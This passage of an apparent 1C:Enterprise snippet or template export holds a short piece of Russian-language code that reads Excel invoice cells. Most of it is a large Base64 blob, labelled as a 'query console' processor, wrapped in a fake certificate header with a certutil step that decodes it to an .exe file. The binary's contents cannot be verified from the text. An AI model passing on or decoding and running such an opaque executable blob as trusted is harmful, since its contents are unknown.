	ВВ = СокрЛП(Инвойс.Sheets(Страница).Cells(Стр, Кол).Value); //Инвойс = ПолучитьCOMОбъект(АдресФайла);
	Возврат ВВ;
КонецФункции"}
}
}
},
{22,
{"Обработки и Обработка ""Внешних обработок""",1,0,"",""},
{4,
{"Обработки (зашифрованные в Base64) (расшифровать так: certutil -f -decode ШифрованныйФайл.txt РасшифрованныйФайл.exe)",1,0,"",""},
{0,
{"Консоль запросов",0,0,"","-----BEGIN CERTIFICATE-----
////fwACAAAAAAAAAAAAAA0KMDAwMDAyMjggMDAwMDAyMjggN2ZmZmZmZmYgDQpX
AgAA1gIAAP///3/1BAAAeAUAAP///389IgAAvCIAAP///3/bJAAAXiUAAP///39x
MAAA8DAAAP///38PMwAAkjMAAP///38dowAAnKMAAP///3+7pQAAPqYAAP///39f
vAAA3rwAAP///3/9vgAAgL8AAP///38i4AAAoeAAAP///3/A4gAAQ+MAAP///39i
BQEA4QUBAP///38ACAEAgwgBAP///3/4DgEAdw8BAP///3+WEQEAGRIBAP///38J
HAEAiBwBAP///3+nHgEAKh8BAP///3+SUwEAEVQBAP///38wVgEAs1YBAP///3+h
dAEAIHUBAP///38/dwEAwncBAP///39xfQEA8H0BAP///38PgAEAkoABAP///39n
kgEA5pIBAP///38FlQEAiJUBAP///39LnQEAyp0BAP///3/pnwEAbKABAP///38s
wgEAq8IBAP///3/KxAEATcUBAP///38p0gEAqNIBAP///3/q2AEAadkBAP///3+I
2wEAC9wBAP///3906AEAu+gBAP///39a6wEA2esBAP///3/47QEAe+4BAP///39Q
9AEAz/QBAP///3/u9gEAcfcBAP///3/BCAIAQAkCAP///39fCwIA4gsCAP///39j
4QIA5uECAP///38VBAQAlAQEAP///3+zBgQANgcEAP///38+JQQAfSUEAP///3+c
JwQA4ScEAP///38AKgQARyoEAP///38NCjAwMDAwMDYwIDAwMDAwMDYwIDdmZmZm
ZmZmIA0KAAAAAAAAAAAAAAAAAAAAAAAAAAAwAGIAYQA4ADUANgA4ADQALQBmADYA
NQBiAC0ANAA3ADgAMAAtAGEAMgA5AGMALQA4AGMAMQBjAGUANgBiAGMAYwA3AGEA
NgAAAAAADQowMDAwMDBjNiAwMDAwMDIwMCA3ZmZmZmZmZiANCpWQQUqEMQyF9wNz
B6nbBpq2f9MeJ6mdAwiupODenRdwMwcYwYEBZeYKmZN4BWsHRZeSEN6Dj5eQj7fT
Pdr16jLcVP6XHyWcl5QjbNIiECk7YF8q5Iq1JamVOHVrdKvH84O+606fzo/6Mt2z
7sc86FFfdWcuseb2zgz8B7rS0x9qZJmxFm3wzWViAYwFIRZJwMIEMSyEEpGrFxv6
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
IJUfqkQohEnAYHjsIYVDDCZXlCQ68Zn2Bsb19qVOCLwamM/OlLlDtg4JWGWEzf5f
V5Jv0++aj9Ino5ek+XE2Uy8ZijA42lMG7lWs+7ZnZ1Ke9cjO5DQ7H5+dxYiy88Dw
9RPO3HJEmXtw3Z1m9fasTnuGX2ZD2mk/PiLznRqlNApu6ZznjI5E5d/kPcx1o+j9
TNHOESVOwXZvTQ9fhbSs1wau/oiw9Qhp3wwkzWIr+HENfRpzrZijFQO3zGK5GC7Z
k8GtAm3G4Q5B51myMlvs0Ja+gKMZPaJQHDZUu29AXsEaLjs26uWoor6/kt8kBCB4
VBAwgB5O4aATDkgPOCDDPYww+NrFtz3K1xZaH6Yv+qLBCadll7bf9Yxqi6Wv4G9U
hLIRRWh/LZzGZ2d80t1WzdzWw82ZzW5iKk6MC8MErjMVNlZuhxt33z85D2ptuJcO
gyuuUM54ZWsjXo/iaPbu3bWNlXv/H3c1eSjZ7R9aKqX1WAaIkyEa2G187GfdzxaO
j+VZ6xPw/6fNj0281AZ9MPGsfV7GRolbMyVxvuO5ZyMxi6Wv0u9sDH5ncqLpe258
7Az8p39KD5qPa3b0v2HMYfovsxT5Txuq9hGc5sNa+nn6fc1snVoS0GpCvvnoAlB9
aaN4L4/q1h4DlOS19B/Q+Dw9yGY6A4wbRDDcVMr22i9rg8HIBWD1EPg3OLIPnT89
